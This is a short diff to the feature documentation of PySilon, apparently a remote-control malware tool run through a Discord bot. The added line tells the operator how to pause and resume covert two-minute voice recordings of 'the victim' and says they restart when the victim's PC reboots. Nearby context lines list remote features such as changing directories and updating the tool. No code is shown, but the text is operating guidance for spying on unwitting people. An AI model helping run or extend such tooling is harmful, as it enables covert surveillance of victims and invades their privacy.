@@ -99,3 +99,4 @@ change working directory
 
 update PySilon remotely
 
+To disable the 2 minute voice recordings, just type 'disable' into the channel with the voice recordings. To resume / restart the voice recordings delete the 'disable' text. The bot should automatically restart the voice recordings once the victim restarts his pc.
